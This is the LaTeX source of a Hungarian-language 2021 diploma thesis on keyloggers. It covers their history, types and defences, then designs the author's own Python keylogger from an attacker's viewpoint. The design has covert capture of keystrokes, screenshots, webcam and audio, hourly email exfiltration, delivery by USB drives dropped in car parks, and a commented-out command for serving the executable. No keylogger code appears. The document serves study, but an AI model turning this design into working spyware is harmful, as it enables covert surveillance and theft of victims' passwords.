\documentclass[a4paper, 11pt]{article}

\title{Keylogger}
\author{Felmeri Zsolt}
\date{}

%\usepackage[none]{hyphenat}
\usepackage{graphicx}
\usepackage{multicol}
\usepackage{float}
\usepackage{ragged2e}
\usepackage{setspace}
\usepackage{indentfirst}
\usepackage{adjustbox}
\usepackage[normalem]{ulem}
%\usepackage{algpseudocode}
\usepackage{listings}
\usepackage[left=4cm, right=3cm, top=3cm]{geometry}
\usepackage[backend=biber]{biblatex}
\addbibresource{references.bib}



\lstdefinestyle{mypython}{	
%	backgroundcolor=\color{white}, % choose the background color;
	basicstyle=\fontsize{11}{11}\ttfamily,% the size of the fonts that are used for the code
	breakatwhitespace=false, % sets if automatic breaks should only happen at whitespace
	breaklines=true, % sets automatic line breaking
%	commentstyle=\color{dkgreen},  % comment style
%	deletekeywords={...},  % if you want to delete keywords from the given language
%	escapeinside={\%*}{*)},  % if you want to add LaTeX within your code
	extendedchars=true,  % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
	frame=none,	 	 % adds a frame around the code
	keepspaces=true, % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
%	keywordstyle=\color{blue}\bfseries, % keyword style
	language=Python, % the language of the code (can be overrided per snippet)
%	otherkeywords={*,}, % if you want to add more keywords to the set
	numbers=none,  % where to put the line-numbers; possible values are (none, left, right)
	numbersep=5pt, % how far the line-numbers are from the code
%	numberstyle=\tiny\color{gray}, % the style that is used for the line-numbers
%	rulecolor=\color{black}, % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
	showspaces=false,% show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
	showstringspaces=false,  % underline spaces within strings only
	showtabs=false,  % show tabs within strings adding particular underscores
	%stepnumber=1,  % the step between two line-numbers. If it's 1, each line will be numbered
%	stringstyle=\color{mauve}, % string literal style
	tabsize=2,
	columns=fullflexible  % Using fixed column width (for e.g. nice alignment)
	morecomment = [l]{\#},
	morecomment = [s]{'''}{'''},
	morestring=[b]{",'}, 
	sensitive = true,
	morekeywords={abstract, event, new, struct,
		as, explicit, None,
		base, extern, object, self,
		bool, False, raise,
		break, finally, True,
		byte, Override, try,
		float, for, uint,
		char, foreach,
		class, if,
		continue, in, return,
		decimal, int, sbyte,
		do, is, while,
		double, else, instanceof,
		def}
}

\lstset{style=mypython}

\begin{document} 
% title page (ro)
\begin{titlepage}
\noindent \rule[20pt]{\textwidth}{1pt}
\begin{centering}
\vspace{4pt}
{\fontsize{18pt}{1} \textbf{UNIVERSITATEA SAPIENTIA DIN CLUJ-NAPOCA}}\\ \vspace{4pt}
{\fontsize{16pt}{1} \textbf{FACULTATEA DE ȘTIINȚE TEHNICE ȘI UMANISTE,\\
TÎRGU-MUREȘ\\
SPECIALIZAREA CALCULATOARE}}\\
\vspace{10em}
{\fontsize{28pt}{1} \textbf{KEYLOGGER}} \\
\vspace{10em}
{\fontsize{24pt}{1} \textbf{PROIECT DE DIPLOMĂ}}\\
\end{centering}

\vspace{15em}
\begin{noindent}
{\fontsize{16pt}{1} \textbf{Coordonator ştiințific:}}
\begin{hfill}
{\fontsize{16pt}{1} \textbf{Absolvent:}}
\end{hfill}
\end{noindent}

\begin{noindent}
\hspace{2.5em}
{\fontsize{14pt}{1} \textbf{Dr. Szántó Zoltán}}
\begin{hfill}
{\fontsize{14pt}{1} \textbf{Felmeri Zsolt}}
\end{hfill}
\end{noindent}

\vspace{5em}
\centering
{\fontsize{28pt}{1} \textbf{2021}}
\end{titlepage}

\begin{titlepage}
\noindent \rule{\textwidth}{1pt}
\vspace{1em}

\noindent \begin{tabular}{|l c r|}
\hline
UNIVERSITATEA “SAPIENTIA” din CLUJ-NAPOCA & & \textbf{Viza facultății:}\\
Facultatea de Științe Tehnice și Umaniste din Târgu Mureș & & \\
Specializarea: \textbf{\underline{Calculatoare}} & & \\
\hline
\end{tabular}
\begin{tabular}{|p{0.271\textwidth} c p{0.271\textwidth}|}
\ & \textbf{LUCRARE DE DIPLOMĂ} &\ \\[3pt]
\hline
\end{tabular}
\begin{tabular}{|p{0.475\textwidth} | p{0.475\textwidth}|}
Coordonator științific: & Candidat: \textbf{Felmeri Zsot}\\
\textbf{ș.l. dr. ing. Szántó Zoltán} & Anul absolvirii: \textbf{2021}\\
\hline
\end{tabular}
\begin{tabular}{|p{0.982\textwidth}|}
\textbf{a) Tema lucrãrii de licențã:}\\[3pt]
SISTEM DE RECUNOAȘTEREA AMPRENTELOR DIGITALE\\[4ex]
\textbf{b) Problemele principale tratate:}\\[3pt]
- Studiu bibliografic privind sistemele de identificare biometrice\\
- Realizarea unei aplicații pentru extragerea trăsăturilor\\
- Clasificare imaginilor capturate\\[4ex]
\textbf{c) Desene obligatorii:}\\[3pt]
- Schema bloc al aplicației\\
- Diagrame UML privind software-ul realizat.\\[4ex]
\textbf{d) Softuri obligatorii:}\\[3pt]
-Aplicație de recunoastere a amprentelor digitale\\[4ex]
\textbf{e) Bibliografia recomandată:}\\[3pt]
[1] -Davide Maltoni, Dario Maio, Anil K. Jain, Salil Prabhakar, "HANDBOOK OF FINGERPRINT RECOGNITION", 2003\\[2pt]
[2] -Atul S. Chaudhari, Dr. Girish K. Patnaik, Sandip S. Patil, "IMPLEMENTATION OF MINUTIAE BASED FINGERPRINT IDENTIFICATION SYSTEM USING CROSSING NUMBER CONCEPT", International Journal of Computer Trends and Technology (IJCTT) - volume 8 number 4,  Feb 2014\\[4ex]
\hline \\
\textbf{f) Termene obligatorii de consultații:} săptămânal\\[5pt]
\textbf{g) Locul și durata practicii:} Universitatea Sapientia,\\
Facultatea de Științe Tehnice și Umaniste din Târgu Mureș\\[5pt]
\ \ \ \ \textbf{Primit tema la data de:} ...\\
\ \ \ \ \textbf{Termen de predare:} ...\\[3ex]
\textbf{Semnătura Director Departament \ \ \ \ \ \ \ \ \ \ \ Semnătura coordonatorului}\\[5ex]
\textbf{Semnătura responsabilului \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ Semnătura candidatului}\\
\textbf{programului de studiu}\\[2ex]
\hline
\end{tabular}
\end{titlepage}

% Declaratie tip a.
\begin{titlepage}
\hyphenchar\font=-1
\sloppy

\noindent \rule[10pt]{\textwidth}{1pt}
\begin{flushright}
{\fontsize{12pt}{1} \textbf{Model tip a.}}
\end{flushright}

\vspace{7em}
\begin{center}
{\fontsize{12pt}{1} \textbf{Declaraţie}}\\
\end{center}

\vspace{4em}
\doublespacing
%szotagolas rossz
\large Subsemnata/ul \dotuline{FELMERI ZSOLT}, absolvent(ă) al/a specializării \dotuline{INFORMATICĂ}, promoţia \dotuline{2021} cunoscând prevederile Legii Educaţiei Naţionale 1/2011 şi a Codului de etică şi deontologie profesională a Universităţii Sapientia cu privire la furt intelectual declar pe propria răspundere că prezenta lucrare de licenţă/proiect de diplomă/disertaţie se bazează pe activitatea personală, cercetarea/proiectarea este efectuată de mine, informaţiile şi datele preluate din literatura de specialitate sunt citate în mod corespunzător.

\vspace{15em}
\begin{flushleft}
{\large Localitatea,\\
Data:}
\end{flushleft}

\begin{flushright}
{\large Absolvent\\
Semnătura…………………}
\end{flushright}

\end{titlepage}

% Declaratie tip b.
\begin{titlepage}
\hyphenchar\font=-1
\sloppy

\noindent \rule[10pt]{\textwidth}{1pt}
\begin{flushright}
{\fontsize{12pt}{1} \textbf{Model tip b.}}
\end{flushright}

\vspace{7em}
\begin{center}
{\fontsize{12pt}{1} \textbf{Declaraţie}}\\
\end{center}

\vspace{4em}
\doublespacing

\large Subsemnata/Subsemnatul ......................................................., funcţia ……………, titlul ştiinţific ………………… declar pe propria răspundere că ........................................., absolvent al specializării ............................ a întocmit prezenta lucrare sub îndrumarea mea.
\par În urma verificării formei finale constat că lucrarea de licenţă/proiectul de diplomă/disertaţia corespunde cerințelor de formă şi conținut aprobate de Consiliul Facultăţii de Științe Tehnice și Umaniste din Târgu Mureș în baza reglementărilor Universităţii Sapientia. Luând în considerare şi Raportul generat din aplicaţia antiplagiat ''Turnitin'' consider că sunt îndeplinite cerințele referitoare la originalitatea lucrării impuse de Legea educației naționale nr. 1/2011 şi de Codul de etică şi de ontologie profesională a Universităţii Sapientia, şi ca atare sunt de acord cu prezentarea şi susținerea lucrării în fața comisiei de examen de licență/diplomă/disertaţie.

\vspace{5em}
\begin{flushleft}
{\large Localitatea,\\
Data:}
\end{flushleft}

\begin{flushright}
{\large Semnătura îndrumătorului}
\end{flushright}

\end{titlepage}

% Turnitin similarity report
\begin{titlepage}
\noindent \rule[10pt]{\textwidth}{1pt}
\end{titlepage}

% table of contents
\noindent \rule[10pt]{\textwidth}{1pt}
\renewcommand{\contentsname}{Tartalomjegyzék}
\tableofcontents
\thispagestyle{empty}
\cleardoublepage

% table of figures
\noindent \rule[10pt]{\textwidth}{1pt}
\renewcommand{\listfigurename}{Ábrák jegyzéke}
\listoffigures
\thispagestyle{empty}
\cleardoublepage

% table of tables
\noindent \rule[10pt]{\textwidth}{1pt}
\renewcommand{\listtablename}{Táblázatok jegyzéke}
\listoftables
\thispagestyle{empty}
\cleardoublepage

% content section (body)
\setcounter{page}{1}
\setlength{\parindent}{0.5cm}

\hyphenchar\font=-1
\sloppy

\section{Bevezető}\label{sec:intro}
Világunk egyre inkább a digitalizálódás fele halad. Ennek következtében már a legtöbb embernek birtokában van legalább egy számítógép, ami lehet hordozható laptop vagy asztali gép. Mivel az emberek 2021-ben rendelkeznek digitális ujjlenyomattal, ezért az adatok bisztonsága előtérbe kerül. Egy ilyen eszköz, amely az adatokkal dolgozik, a keylogger. A keylogger egy olyan szoftver vagy hardver, amely a számítógéphez csatlakoztatott billentyűzet naplózására használandó. A dolgozatban a legnagyobb szerepben a szoftver alapú keylogger részesül. Ugyanakkor, a szoftver kivitelezésénél a támadó szemszöge kerül előtérbe, akinek az a célja, hogy adatokat feltünésmentesen tudjon eltulajdonítani.

A keyloggereknek van jó, illetve rossz oldaluk is. Rosszhírük a filmvilágnak köszönhetően terjedt el rohamosabban, ugyanis a filmekben az úgynevezett hacker használ ilyen és ehez hasonló eszközöket. A mindennapi életből vehetjük akár egy gyanakodó férj vagy feleség példáját. Akár a féltékenység szüleményeként létrejött keylogger segíthet annak a felderítésében, hogy a másik fél kivel kommunikál és akár az egész írásbeli beszélgetés nyomon követhető. A fennebb megadott példák, helyzetek a rossz használati utakról szólnak, viszont egy sokkal helyénvalóbb módja a használatának cégeken belül mutatkozik meg. A cégek esetében, ha hiba keletkezik ellenőrizni lehet, hogy mi is a kiváltó ok, azáltal, hogy nyomon tudják követni az alkalmazottaik számítógép használatát az irodában.

Az első keylogger hardver alapú volt, amit a Szovjet Únió fejlesztett ki a 1970-es évek közepén írógépeket célozva. Megmérte az IBM Selectric írógépek nyomtatófejének mozgását a regionális mágneses mezőre gyakorolt finom hatásokon keresztül, amelyeket a nyomtatófej forgása és mozgásai okoztak. Egy korai keyloggert Perry Kivolowitz írt, és 1983 november 17-én tette közzé az Usenet net.unix-wizards, net.sources. A felhasználói módú program a karakterlisták (kliensek) felkutatásával és kiírásával működött, ahogyan a Unix kernelbe beállították. Az 1970-es években a kémek keyloggereket telepítettek az amerikai nagykövetség és a moszkvai konzulátus épületébe, kihasználva a Selectric II és a Selectric III elektomos írógépek hibáit. A szovjet nagykövetségek elektromos írógépek helyett kézi írógépeket használtak bizalmas információkhoz, nyilván azért, mert nem sebezhetőek az ilyen támadásokkal szemben. 2013-tól az orosz különleges szolgálatok még mindig írógépeket használnak.

Az ellenintézkedések hatékonysága változó, mivel a keyloggerek különböző technikákat alkalmaznak az adatok rögzítésére. Így az ellenintészkedéseknek hatékonynak kell lenniük az adott adatrögzítési technikával szemben is. A grafikus felhasználói felülettel rendelkező operációs rendszereken használható a képernyőn megjelenő billentyűzet. Ez hatékony a hardveres keyloggerek ellen, ugyanis egyértelmű módon nem kerül sor a hagymányos billentyűzet használatára.

A következő fejezetben részletes bemutatásra kerülnek a keyloggerek tipusai és az ellenintézkedések formái.

\subsection{Célkitűzés}
%bullet formatum

\section{Elméleti megalapozás és bibliográfiai tanulmány (a téma pontos körülhatárolása érdekében végzett dokumentálódás)}\label{sec:bibl}
\subsection{Definíció}
\parencite{ahmed2014survey} A keyloggerek egyfajta szoftverek, amelyek rögzítik a billentyűzet billentyűleütéseit, és naplófájlba mentik azokat. Rosszindulatúsága abból fakad, hogy egy harmadik félnek eljuttatja a naplófájlba elmentett adatokat. Ennek következtében képesek érzékeny információk, például felhasználónév, PIN-kód és jelszó elfogására.  A rosszindulatú programoknak számos nevük van az angol nyelvben, például: ``malicious code (MC)'', ``malicious software'', ``malware'' és ``malcode''.

Numerous, McGraw és Morrisett a következő képpen definiálták a rosszindulatú kódot: \cite{ahmed2014survey} ``bármely kód, amelyet hozzáadtak, megváltoztattak vagy eltávolítottak egy szoftverrendszerből annak érdekében, hogy szándékozan kárt okozzanak vagy felforgassák a rendszer tervezett funkcióját.''

Egy általános keylogger use-case diagramja a Figure \ref{fig:genkeylogger}-en látható. Ennek főbb mozzanatai: az áldozat gépének megfertőzése, az áldozat számítógéppel való interakciója, adatgyűjtés és az adatok megtekintése.

A szoftver eljuttatása az áldozat gépére különböző eszközök segítségével történhet, mint például e-mail, USB Rubber Ducky vagy hálózati szerver. E-mail-en keresztül csatolmányban lehetne elküldeni, de az e-mail szerverek blokkolják a futtatható fájlok küldését, mert tartalmazhat malcode-ot. Ezért egy letöltő linket szoktak küldeni, tehát a hálózati szerver az e-mail-lel együtt dolgozik.

A USB rubber ducky egy speciális USB, amit a számítógép billentyűzetként ismer fel. Léteznek úgynevezett ducky szkriptek, amelyeket bináris állományként a Windows NT rendszerek automatikusan lefuttatnak. A bináris állomány úgy hajtódik végre mintha billentyűzettel pötyögnénk be a szöveget csak sokkal gyorsabban kerül kivitelezésre.

A billentyűzet, a mouse használatát és az áldozat mindennapi tevékenységét a számítógéppel nevezzük a számítógéppel való interakciónak.

A köztes elem, amely összeköti a két felet az az internet. A két fél a világ bármelyik felén lehet, mert a kapcsolat létesítését nem befolyásolja. A szoftver tartalmazhat több kapcsolatot is, de általában csak egyet szokott tartalmazni.

Az adatgyűjtés során az információk egy, a szoftver által generált, naplóállományba mentődnek el. A több kapcsolatot kialakító szoftvernél figyelembe kell venni, hogy a különböző gépektől elküldött adat ne egymáson, azaz minden információ egy állományhoz tartozzon, hanem külön legyenek elmentve a kiértékelés szempontjából. Az adatgyűjtés lehet lokálist vagy globális. Lokálisró akkor beszélünk, ha csak egy alkalmazás használatakór kerül elmentésre az adat. A globális adatgyűjtés a rendszer teljes használatát átkarolja.

\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/general\ keylogger}
\caption{Általános keylogger}
\label{fig:genkeylogger}
\end{figure}

\subsection{Keylogger típusok}
Operációs rendszer szintjén két féle keylogger létezik: magas szintű és alacsony szintű (high-level and low-level) \cite{wood2010keyloggers}. A magas szintű keyloggerek az operációs rendszer felhasználói módjában hajtódnak végre, ezek a felhasználói mód horgainak variációival valósulnak meg. Windows operációs rendszeren a felhasználó billentyű-leütéses eseményeit egy olyan üzenetkezelő mechanizmus jelöli, amely a billentyűzet-ről átadja az adatokat annak az ablaknak, amely válaszol a billentyűleütésre. Ez az üzenetmechanizmus összekapcsolható, hogy a támadónak hozzáférést biztosítson a billentyűleütésekhez még azelőtt. hogy elérnék az alkalmazást. A kontextustól függően a kifejlesztett keylogger globális vagy lokális horgot valósíthat meg a billentyűleütések eseményeinek lekérésére. A globális horgok az egész rendszerre kiterjedő üzeneteket, míg a lokális horgok az alkalmazás specifikus üzeneteket figyelik. Ezekkel az összekapcsolt üzenetekkel a támadó elolvashatja a beírt billentyűleütéseket, módosíthatja azok adatait, sőt teljesen megszakíthatja az üzenetáramlást. Azonban általában a keyloggerek csak a billentyűleütés adatait olvassák és továbbítják az üzenetet a lánc következő tagjának.

Az alacsony, kernel szintű keyloggerek általában ``rootware''-ként valósulnak meg \cite{butler2006r2}, ``rootkit'' és ``spyware'' kombinációjaként. A rootkit egy olyan program vagy eszközkészlet, amely titokban fut egy fertőzött gépen annak érdekében, hogy hosszú távú, észrevétlen hozzáférést biztosítson a rendszer gyökeréhez a támadó számára. Az elrejtettség általában kiemelt fontosságu a rootkit számára, mivel célja az operációs rendszer magjának (kernel) állandó módosítása. A spyware olyan szoftver, amely felhaszálói adatokat gyűjt az áldozat beleegyezése nélkül. Ezt a két kifejezést használva a rootware keyloggerek olyan rejtett szoftverek, amelyek bekapcsolódnak a létfontosságú rendszer szokásos munkameneteljébe, hogy összegyűjtsék és továbbítsák a felhasználói billentyűleütéseket az áldozat tudta és beleegyezése nélkül.

A keyloggerek négy fő kategóriára oszthatók: hardver, wireless, akusztikus és szoftver \cite{ahmed2014survey}. Bár ezeknek különböző a használati módjuk és az információ szerzési módszereik, egy közös dolgon osztoznak: lementik az ellopott információt vagy adatot egy log állományba.

\subsubsection{Wireless keylogger}
A wireless keylogger kihasználja a Bluetooth interfészeket, hogy a rögzített adatokat 100 méteres körzetben továbbítsa. Elsődleges célja az átvitt csomagok lehallgatása wireless billentyűzetről. Hátránya, hogy szükséges egy fogadó/antenna relatív közel a célpont munkakörnyékéhez.

\subsubsection{Hardver keylogger}
A hardver keylogger egy olyan fizikai eszköz, amely a billentyűzet és a számítógép között helyezkedik el. Kétféle csatlakozási módszer létezik: a keyloggerek közvetlenül összekapcsolhatók a billentyűzet és a számítógép között. A második módszer nem igényel fizikai kapcsolatot a számítógéppel, hanem egy keylogger áramkör telepítését igényli a billentyűzetbe. Ennek a módszernek az az előnye, hogy a felhasználók nem figyelhetik fizikailag a keyloggert.

\subsubsection{Szoftver keylogger}
A szoftver keylogger elfogja a billentyűzet és az operációs rendszer mentén haladó adatokat. Gyűjti a billentyű karaktereit egy állományba, majd továbbítja a támadónak, aki telepítette a keyloggert.

\subsubsection{Akusztikus keylogger}
A hardware keylogger-rel ellentétben az acoustic keylogger elemzésekor rögzíti az egyes billentyűleütések hangját. Különleges felszerelés szükséges a felhasználó gépelés hangjának meghallgatásához. Parabolikus mikrofonokat használnak nagy távolság alapuló rögzítésre, ezért ezt a mikrofont arra használják, hogy a billentyűzet hangját 30 méter távolságból vegye fel a célzott helyről.

\subsection{Keyloggerek elleni védelem}
Mivel létezik a rossz akarat, a kártevés akarata, ezért szükség van ezek kivédésére is. A rossz indulattal használt keyloggereket nagymértékben ellenőrizték és tettek ellenük, de napjainkban egyre több ilyen szoftver készül. Ezért lehetetlen az összeset megakadájozni. \cite{wood2010keyloggers} A rosszindulatú programok észlelését gyakran satikusan vagy dinamikusan nézik. A statikus észlelés magába foglalja az aláírás alapú mintázatfelismerést, míg a dinamikus észlelés viselkedésbeli és működési alapú megfigyelést jelent. A statikus felismeréshez rosszindulatú programok észlelésére van szükség a rendszer figyelése érdekében, hogy a felismerhető rosszindulatú aláírásokat vagy `checksum'-okat kiszűrje. Ezek az aláírások lényegében oszlyan gépi utasítások szekvenciái, amelyek megfelelnek a program által a gazdagépen végrehajtott gyanús tevékenységnek. Két jelentős probléma merül fel ezzel a technikával:
\begin{itemize}
\item a rosszindulatú programfelismerőt folyamatosan frissíteni kell az új rosszindulatú programokkal
\item nincs védelem a rosszindulatú programok ellen, amelyek aláírása nem ismert
\end{itemize}
Az utóbbi a rosszindulatú keyloggerekre erősen vonatkozik, mivel nincs egyedi aláírásuk. Ezért dinamikus detektálási technikákat kell alkalmazni a rosszindulatú keyloggerek észlelésére.

\subsubsection{Aláírás alapú anti keylogger}
\cite{tuli2013system} Ezek olyan alkalmazások, amelyek a telepített fájlok vagy DLL-ek, valamint az általa készített beállításjegyzék alapján azonosítják a keyloggereket. Bár sikeresen azonosítja az ismert keyloggereket, nem tudja azonosítani azokat a keyloggereket, amelyeknek aláírása nincs tárolva az adatbázisban.A virusirtó szoftverek többsége ezen a megközelítésen alapuló eljárást alkalmazzák.

\subsubsection{Horog alapú anti keylogger}
\cite{tuli2013system} A windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt használja, ugyanazokat a funkciókat, mint a horog alapú keyloggerek. Ezt arra használják, hogy figyelemmel kísérjék a rendszer bizonyos típusú eseményeit, például billentyűleütés vagy egérkattintás. Azonban a horog alapú anti keyloggerek blokkolják a vezérlés ezen átadását egyik horog eljárásról a másikra. Ennek eredményekét a keylogger szoftver nem generál naplózást a billentyűleütés elfogásakor. Bár a horog alapú anti keyloggerek jobbak mint az aláírás alapú anti keyloggerek, de ezek továbbra sem képesek megállítani minden keyloggert.

\cleardoublepage
\section{A rendszer specifikációi és architektúrája (szoftverek és hardverek esetében)}\label{sec:specs_and_arch}
%virtualis gepek -> meresek, hany klienst bir el
%kiserletek, grafikonok
%kovetelmeny specs - func, nem func
%architektura osszes lenyeges komponens

\subsection{Felhasználói követelmények}
% figure 2 -> figure 1 az en rendszeremre specifikusan
% use case activity diagramja
%user needs
%what the user does with the system | activities that users must be able to perform
%\noindent - internet $=>$ connection\\
%- uses the menu: 1)screenshot 2)webcam picture 3)record audio 4)exit\\

%lehetoseg van kerni screenshot, adat kuldes egy oraban
%passziv felhasznalo -> target olyan ertelemben h nem tud errol

A rendszernek két típusú felhasználója van: egy aktív és egy passzív. A Figure \ref{fig:specifickeylogger} mutatja a személyreszabott rendszer use case diagramját.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/specific\ keylogger}
\caption{Személyreszabott keylogger}
\label{fig:specifickeylogger}
\end{figure}

A passzív felhasználó az ábrán levő áldozatot (target) jelképezi. A szoftver az áldozat tudta nélkül kell, hogy fusson az operációs rendszeren, miközben az áldozat folyamatosan használja a számítógépjét.

A támadó (hacker) tölti be az aktív felhasználó szerepkörét. Legelső lépése a szoftver eljutatása az áldozat gépére. Az eljuttatáshoz használható a USB rubber ducky, amiből többet is lehet készíteni és elszórni például egy autó parkolóban, mert egy kíváncsi természetű ember mindig akad. A USB eszközök elszórása után a hacker feladata, hogy elindítsa a szoftver másik felét, hogy a kapcsolat létre tudjon jönni.

A kapcsolat létrejötte után, a támadónak lehetősége van megtekinteni az áldozat rendszerének az információit, mint például a számítógép neve, processzor információ, bejelentkezett felhasználó felhasználóneve, a használaatban levő operációs rendszer neve, verziószáma és arhitektúrája. Ha az áldozat használta a billentyűzetet, akkor a támadó megtekintheti az áldozat által lenyomott billentyűket karakterek vagy szavak formátumában.

A támadónak lehetősége van további információ szerzésre, ahogyan azt a Figure \ref{fig:menudia} tartalmazza, mégpedig képernyőkép (screenshot), webkamerakép (webcam picture) és hangfelvétel (audio recording) formátumban.
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/menu\ diagram}
\caption{menü diagram}
\label{fig:menudia}
\end{figure}
Ha a támadó úgy látja jónak, lehetősége adódik a kapcsolat felbontására. A kapcsolat felbontása után a billentyűzet eseményei az áldozat rendszerére mentődnek el egy állományba, és óránkánt e-mail küldésével továbbítja ezt az állományt a támadónak egy képernyőképpel együtt.

%nem ide jon
% fork alol jon ki
% szet kell szedni
% hamis ag + collect data
%nem kell a menu
%\begin{figure}[H]
%\centering
%\includegraphics[width=400pt]{../images/userreq\ diagram}
%\caption{Felhasználói aktivitás}
%\label{fig:useractivitydia}
%\end{figure}

\subsection{Rendszer követelmények}
%what the system “shall do.”
%can my pc run it?

\subsubsection{Funkcionális követelmények} %milyen inputra milyen output
%menu options
%logging
Az aktív felhasználó szemszögéből a Figure \ref{fig:seqdia} szemlélteti a rendszer működési elvét. A szerver és a kliens kapcsolódása után, a támadónak igénye lehet használni a GUI-t és a parancssoron megjelenő menüt. Amint a kapcsolat létrejött a GUI automatikusan elindul, és valós időben adódnak hozzá az adatok.

A GUI segít a megszerzett adatok megjelenítésében. Itt három opció lehetséges: rendszerinformáció megtekintése, karakterek, illetve a karakterekből alkotott szavak megtekintése. Az alábbi opciókat gombnyomásra előhívhatja a felhasználó.

A rendszerinformáció megtekintésében a felhasználónak szükséges rákattintania a $PC Information$ gombra. Ez által egy új ablak ugrik fel, ahol az információk megjelenítésre kerülnek. Az adatok az elmentett fájlból kiolvasva kerülnek az ablak megjelenítő részébe. Ez az ablak bármikor előhívható vagy bezárható, amíg a GUI alkalmazás fut.

A GUI automatikus elinulása után a karaktereket a lementett naplóállományból olvassa ki és jeleníti meg egy legördülő listában, ha létezik ez az állomány. Különben egy üres lista jelenik meg. A szavakat is meg lehet nézni, amelyek úgy épülnek fel, hogy a karakterek egy karakterláncba fűződnek amíg egy $ENTER$ vagy egy $SPACE$ elválasztó karakter nem következik. Megjelenítésüket a karaktereknek és a szavaknak lehet váltogatni tetszés szerint a $Characters$ és a $Words$ gombokat alkalmazva.

Mivel a GUI egy egyedül álló alkalmazás, ezért be lehet zárni, és nem befolyásolja az adatgyűjtést. A parancssoron megjelenő menü arra szolgál, hogy a szerver kérést küldjön a kliens fele. A kérések a következők lehetnek: képernyőkép (screenshot), webkamerakép (webcam picture), hangfelvétel (audio recording) és kapcsolat bezárás. A kérés közben megjelenik, a folyamat ütemezési információja. Például, ha egy képernyőképet kér a felhasználó, akkor megjelenik a folyamat kezdéséhez járuló szöveg, és a befejezésénél a végéhez járuló szöveg, hogy követhető legyen az adatátvitel. A menüpontokat számok formátumban kell megadni a parancssoron:
\begin{itemize}
\item 1 = screenshot
\item 2 = webcam picure
\item 3 = audio recording
\item 4 = connection closure
\end{itemize}

\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/connected\ system}
\caption{A kpcsolatot létesített rendszer}
\label{fig:seqdia}
\end{figure}

%A szoftver három fő komponensből épül fel: szerver, kliens és GUI. Ezen felül található egy mellék állomány, amelyben a szerver és a kliens számára hasznos fuggvények vannak implementálva.
%%reszletes tervezes
%\begin{figure}[H]
%\centering
%\includegraphics[width=400pt]{../images/class\ diagram}
%\caption{osztály diagram}
%\label{fig:classdia}
%\end{figure}
%A Figure \ref{fig:classdia}-en látható az osztályok és az elhatárolt komponensek is. A \textbf{KeyLogger}, \textbf{Server} és \textbf{MenuHandler} osztályok egy komponens, amelyek a szerverhez tartoznak, a \textbf{KeyLoggerClient}, \textbf{Client} és \textbf{MenuHandlerClient} osztályok egy komponens, amelyek a klienshez tartoznak, a \textbf{GUIWindow} osztály egy komponens, amely a GUI-hoz tartozik.
%
%A \textbf{Server} és a \textbf{Client} osztályok hozzák létre a kapcsolatot, ennek a feltétele, hogy a szerver hamarabb el kell legyen indítva mint a kliens. A kapcsolat létesítése után elindul mindkét komponensnél a keylogger, amely szükséges, hogy az információt elküldje és fogadja. A szerfer komponens fogja fogadni azt amit a kliens komponens küld, és azt egy log állományba írja. Az információ a szervernél tartalmazza a billentyű karaktereit, a képernyőképet, a webkamera képet és a hangfelvételt. A karakterek kivételével a többi opciót a \textbf{MenuHandler} osztály fogja igazítani. A szerver küld a kliensnek egy opciót, amely lehet kepernyőkép, webkamerakép vagy hangfelvétel, ezt a kliens komponens \textbf{MenuHandlerClient} osztály fogadja és megpróbálja végrehajtani a feladatot. Ha sikerül elküldi a szervernek, ha nem, akkor egy hibaüzenetet küld, vagy megszakítsa a kapcsolatot. A kapcsolat megszakítésa után a kliens e-mail-t küld oránként, amelyben az addig lementett karakterek és egy képernyőkép van csatolmányként. Mindkét komponensnél a menüt kezlelő osztályok külön szálon kell fussanak, hogy ne blokkolják a fő szálat. Ez által megoldva, hogy párhuzamosan a karakter küldéssel lehet küldeni a többi adatot is.
%
%Szükséges egy eszköz, amely segítségével a futtatható fájlt el lehet juttatni a célpont számítógépére. Lehetséges eszközök a kivitelezésre:
%\begin{itemize}
%\item USB Rubber Ducky
%\item Elküldeni egy e-mail formában
%\end{itemize}
%A USB Rubber Ducky egy olyan usb eszköz, amely segítségével, a számítógéphez való csatlakoztatás után, automatikusan ún. $ducky\ szkripteket$ lehet futtatni. Ezt az eszközt a gép billentyűzetként ismeri fel és a begépelt szkriptet lefuttatja a rendszer, mivel azt hiszi, hogy a billentyűzetet használták. Ehez az eszközhöz és az e-mail-hez is szükséges egy lokális szervert futtatni, amiről a futtatható fájl (a keylogger) letöltődik. A python 3.x \textbf{http.server} moduljával létre lehet hozni egy ilyen szervert. Ahoz, hogy ne csak ugyanazon a hálozaton működjön, ahoz meg kell nyitni egy portot a router-en, és azt a portot meg kell adni argumentumként a szerver létrehozásánál és a publikus ip címmel kell a szerverhez csatlakozni:
%\begin{lstlisting}{language=Bash}
%python3 -m http.server [port]
%\end{lstlisting}

\subsubsection{Nem funkcionális követelmények}
A szoftver működik windows, linux és darwin rendszerek alatt, a verzió nem befolyásolja. A rendszeren szükséges telepíteni a python 3.x verzióját, mivel olyan modulok vannak használatban, amelyeket a python 2.x nem ismer. Ez egy olyan szoftver, amelyet törvényes és törvénytelen dolgogra is lehet használni. Törvényesen például monitorizálni a céges alkalmazottak munka időszakában lebonyolított tevékenységeket. Törvénytelen például, ha valaki arra használja, hogy ellopjon bizalmas információkat személyektől. Ez a használón múlik, hogy melyik utat választja.

A python 3.x verzióhoz szükséges modulok a futtatáshoz:
\begin{multicols}{2}
\begin{itemize}
\item pynput = 1.6.8
\item pyautogui
\item pyaudio
\item wave
\item socket
\item opencv
\item getpass
\item os
\item sys
\item threading
\item datetime
\item smtplib
\item email
\item imaplib
\item shutil
\item platform
\item tkinter
\item logging
\item pyinstaller
\item http.server
\end{itemize}
\end{multicols}
A \textbf{pynput} modul a billentyűzet és az egér eseménykezelését teszi lehetővé. Egy régebbi verzióját kell használni ($1.6.8$), mert a legújabb ($1.7.2$) nem kompatibilis a fordító programokkal.

A \textbf{pyautogui} modullal képernyőképet lehet készíteni, és azt elmenti egy fájlba a rendszeren. A végrehajtásához szükséges, hogy a felhasznéló képernyőképet tudjon készíteni önmagénak.

